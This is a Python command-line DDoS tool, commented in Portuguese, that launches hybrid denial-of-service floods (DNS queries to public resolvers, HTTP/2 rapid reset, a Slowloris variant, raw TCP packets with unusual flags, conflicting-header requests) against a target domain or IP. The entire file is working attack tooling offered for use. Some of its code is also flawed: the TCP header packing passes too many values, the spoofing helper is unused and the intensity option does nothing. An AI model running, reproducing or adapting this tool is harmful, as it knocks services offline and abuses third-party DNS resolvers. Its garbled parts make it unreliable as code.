#!/usr/bin/env python3
import socket
import struct
import random
import threading
import time
import sys
import http.client
import ssl
import argparse
from concurrent.futures import ThreadPoolExecutor

# Importações opcionais para DNS Amplification (se a biblioteca dns estiver instalada)
try:
    import dns.message
    import dns.rdatatype
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

# Importações opcionais para HTTP/2 (se a biblioteca h2 estiver instalada)
try:
    import h2.connection
    import h2.config
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

class AdvancedDDOSAttacker:
    def __init__(self, target_domain, target_ip=None, attack_type="hybrid", duration=60, port=80, intensity=1000):
        """
        Inicializa o atacante avançado.
        """
        self.target_domain = target_domain
        # Se o usuário passou um IP, usamos ele como domínio e IP
        if self._is_ip(target_domain):
            self.target_ip = target_domain
        else:
            self.target_ip = target_ip or self._resolve_domain(target_domain)
            
        self.attack_type = attack_type.lower()
        self.duration = duration
        self.intensity = intensity
        self.port = port
        self.stop_event = threading.Event()
        self.stats = {"packets_sent": 0, "start_time": time.time()}
        self.stats_lock = threading.Lock()
        
        # Configurações de ataque
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
            "curl/8.0.1",
            "python-requests/2.31.0"
        ]
        
        # Refletidores DNS públicos para amplificação
        self.dns_reflectors = [
            "1.1.1.1",      # Cloudflare DNS
            "8.8.8.8",      # Google DNS
            "9.9.9.9",      # Quad9
            "1.0.0.1",      # Cloudflare DNS alt
            "149.112.112.112" # OpenDNS
        ]

    def _log(self, message):
        """Log com timestamp."""
        print(f"[{time.strftime('%H:%M:%S')}] {message}")

    def _is_ip(self, value):
        """Verifica se o valor é um IP válido."""
        try:
            socket.inet_aton(value)
            return True
        except socket.error:
            return False

    def _resolve_domain(self, domain):
        """Resolve o domínio para IP."""
        try:
            return socket.gethostbyname(domain)
        except socket.gaierror:
            self._log(f"❌ Não foi possível resolver o domínio {domain}.")
            sys.exit(1)

    def _generate_random_ip(self):
        """Gera um IP de origem aleatório para spoofing."""
        return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 254)}"

    def _update_stats(self, count=1):
        """Atualiza o contador de pacotes enviados de forma thread-safe."""
        with self.stats_lock:
            self.stats["packets_sent"] += count

    def dns_amplification_attack(self):
        """
        Implementa DNS Amplification Attack.
        """
        if not HAS_DNS:
            self._log("⚠️  Biblioteca 'dnspython' não instalada. Pulando DNS Amplification.")
            return

        self._log(f"🚀 Iniciando DNS Amplification Attack para {self.target_domain}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            dns_message = dns.message.make_query(
                self.target_domain,
                dns.rdatatype.AAAA,
                rd=True,
                rdflag=True
            )
        except Exception as e:
            self._log(f"Erro ao criar mensagem DNS: {e}")
            return

        query_data = dns_message.to_wire()
        
        try:
            while not self.stop_event.is_set():
                reflector = random.choice(self.dns_reflectors)
                try:
                    sock.sendto(query_data, (reflector, 53))
                    self._update_stats()
                except (BlockingIOError, BrokenPipeError):
                    self._log("⚠️  Erro de rede no DNS, reinicializando socket.")
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception as e:
            self._log(f"❌ Erro no DNS Amplification: {e}")
        finally:
            sock.close()

    def http2_rapid_reset_attack(self):
        """
        Implementa HTTP/2 Rapid Reset Attack.
        """
        if not HAS_H2:
            self._log("⚠️  Biblioteca 'h2' não instalada. Pulando HTTP/2 Rapid Reset.")
            return

        self._log(f"🚀 Iniciando HTTP/2 Rapid Reset Attack para https://{self.target_domain}:{self.port}")
        
        def http2_worker():
            while not self.stop_event.is_set():
                try:
                    context = ssl.create_default_context()
                    sock = socket.create_connection((self.target_domain, 443), timeout=0.1)
                    tls_sock = context.wrap_socket(sock, server_hostname=self.target_domain)
                    
                    config = h2.config.H2Configuration(client_side=True)
                    conn = h2.connection.H2Connection(config=config)
                    conn.initiate_connection()
                    tls_sock.sendall(conn.data_to_send())
                    
                    for stream_id in range(1, 10, 2):
                        try:
                            headers = [
                                (":method", "GET"),
                                (":scheme", "https"),
                                (":authority", self.target_domain),
                                (":path", f"/?attack={random.randint(0, 99999)}"),
                                ("user-agent", random.choice(self.user_agents)),
                                ("accept", "*/*"),
                            ]
                            conn.send_headers(stream_id, headers)
                            conn.send_data(stream_id, b"", end_stream=True)
                            tls_sock.sendall(conn.data_to_send())
                            conn.stream_closed(stream_id)
                            tls_sock.sendall(conn.data_to_send())
                            self._update_stats()
                        except Exception:
                            pass
                    tls_sock.close()
                except (ConnectionRefusedError, socket.timeout, OSError):
                    pass

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(http2_worker) for _ in range(50)]
            for f in futures:
                f.result()

    def slowloris_attack(self):
        """
        Implementa Slowloris Attack.
        """
        self._log(f"🚀 Iniciando Slowloris Attack para http://{self.target_domain}:{self.port}")
        
        def slowloris_worker():
            while not self.stop_event.is_set():
                try:
                    conn = http.client.HTTPConnection(self.target_domain, self.port, timeout=30)
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Accept": "*/*",
                        "Connection": "keep-alive"
                    }
                    conn.request("GET", "/", headers=headers)
                    for i in range(10):
                        time.sleep(0.5)
                        conn.request("GET", f"/?slow={i}", headers=headers)
                    self._update_stats()
                    conn.close()
                except (ConnectionRefusedError, socket.timeout, OSError):
                    pass

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(slowloris_worker) for _ in range(100)]
            for f in futures:
                f.result()

    def tcp_exotic_flags_attack(self):
        """
        Implementa TCP Exotic Flags Attack.
        """
        self._log(f"🚀 Iniciando TCP Exotic Flags Attack para {self.target_ip}:{self.port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            self._log("❌ Permissão negada. Execute com sudo para raw sockets.")
            return

        try:
            while not self.stop_event.is_set():
                src_port = random.randint(1024, 65535)
                flags = random.choice([
                    0x00, 0x41, 0x01, 0x02, 0x10, 0x20
                ])
                
                tcp_header = struct.pack("!HHLLBBHHH",
                                        src_port,
                                        self.port,
                                        random.randint(0, 2**32-1),
                                        0,
                                        5,
                                        0,
                                        flags,
                                        65535,
                                        0,
                                        0)

                try:
                    sock.sendto(tcp_header, (self.target_ip, 0))
                    self._update_stats()
                except (BlockingIOError, BrokenPipeError):
                    self._log("⚠️  Erro de rede no TCP, reinicializando socket.")
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except Exception as e:
            self._log(f"❌ Erro no TCP Exotic Flags: {e}")
        finally:
            sock.close()

    def header_smuggling_attack(self):
        """
        Implementa Header Smuggling Attack.
        """
        self._log(f"🚀 Iniciando Header Smuggling Attack para http://{self.target_domain}:{self.port}")
        
        def smuggling_worker():
            while not self.stop_event.is_set():
                try:
                    conn = http.client.HTTPConnection(self.target_domain, self.port, timeout=0.1)
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "Content-Length": "10",
                        "Transfer-Encoding": "chunked",
                        "Connection": "keep-alive"
                    }
                    body = b"x" * 10
                    conn.request("POST", "/", body=body, headers=headers)
                    self._update_stats()
                    conn.close()
                except (ConnectionRefusedError, socket.timeout, OSError):
                    pass

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(smuggling_worker) for _ in range(50)]
            for f in futures:
                f.result()

    def start_attack(self):
        """
        Inicia o ataque híbrido ou específico.
        """
        self._log(f"🎯 Alvo: {self.target_domain} ({self.target_ip})")
        self._log(f"📊 Tipo: {self.attack_type.upper()} | Duração: {self.duration}s | Porta: {self.port}")
        self._log("⏱️  Pressione Ctrl+C para interromper o ataque.")
        
        threads = []
        
        if self.attack_type in ["hybrid", "all"]:
            threads.append(threading.Thread(target=self.dns_amplification_attack, name="DNS-Amplification"))
            threads.append(threading.Thread(target=self.http2_rapid_reset_attack, name="HTTP2-Rapid-Reset"))
            threads.append(threading.Thread(target=self.slowloris_attack, name="Slowloris"))
            threads.append(threading.Thread(target=self.tcp_exotic_flags_attack, name="TCP-Exotic-Flags"))
            threads.append(threading.Thread(target=self.header_smuggling_attack, name="Header-Smuggling"))
        elif self.attack_type == "dns":
            threads.append(threading.Thread(target=self.dns_amplification_attack, name="DNS-Amplification"))
        elif self.attack_type == "http2":
            threads.append(threading.Thread(target=self.http2_rapid_reset_attack, name="HTTP2-Rapid-Reset"))
        elif self.attack_type == "slowloris":
            threads.append(threading.Thread(target=self.slowloris_attack, name="Slowloris"))
        elif self.attack_type == "tcp":
            threads.append(threading.Thread(target=self.tcp_exotic_flags_attack, name="TCP-Exotic-Flags"))
        elif self.attack_type == "smuggling":
            threads.append(threading.Thread(target=self.header_smuggling_attack, name="Header-Smuggling"))
        else:
            self._log("❌ Tipo de ataque inválido.")
            return

        for thread in threads:
            thread.start()
            self._log(f"✅ Thread {thread.name} iniciada.")

        try:
            while time.time() - self.stats["start_time"] < self.duration:
                time.sleep(1)
                pps = self.stats["packets_sent"] / (time.time() - self.stats["start_time"])
                self._log(f"📊 Pacotes enviados: {self.stats['packets_sent']} | PPS atual: {pps:.2f}")
        except KeyboardInterrupt:
            self._log("\n⚠️  Interrupção manual detectada.")
        finally:
            self.stop_event.set()
            for thread in threads:
                thread.join()
            
            total_time = time.time() - self.stats["start_time"]
            avg_pps = self.stats["packets_sent"] / total_time if total_time > 0 else 0
            self._log("\n" + "="*50)
            self._log("📈 RESUMO DO ATAQUE")
            self._log(f"⏱️  Duração total: {total_time:.2f}s")
            self._log(f"📦 Pacotes totais: {self.stats['packets_sent']}")
            self._log(f"📊 PPS médio: {avg_pps:.2f}")
            self._log("="*50)

if __name__ == "__main__": 
    # Configura o parser de argumentos
    parser = argparse.ArgumentParser(description="Gerador de Ataque DDoS Híbrido Avançado")
    parser.add_argument("target", help="IP ou Domínio de destino (ex: 192.168.1.1 ou example.com)")
    parser.add_argument("-t", "--type", default="hybrid", choices=["hybrid", "dns", "http2", "slowloris", "tcp", "smuggling"], help="Tipo de ataque (padrão: hybrid)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duração do ataque em segundos (padrão: 60)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Porta de destino (padrão: 80)")
    parser.add_argument("-i", "--intensity", type=int, default=1000, help="Intensidade alvo (pps) (padrão: 1000)")

    args = parser.parse_args()

    # Cria o atacante
    attacker = AdvancedDDOSAttacker(
        target_domain=args.target,
        attack_type=args.type,
        duration=args.duration,
        port=args.port,
        intensity=args.intensity
    )
    
    # Inicia o ataque
    attacker.start_attack()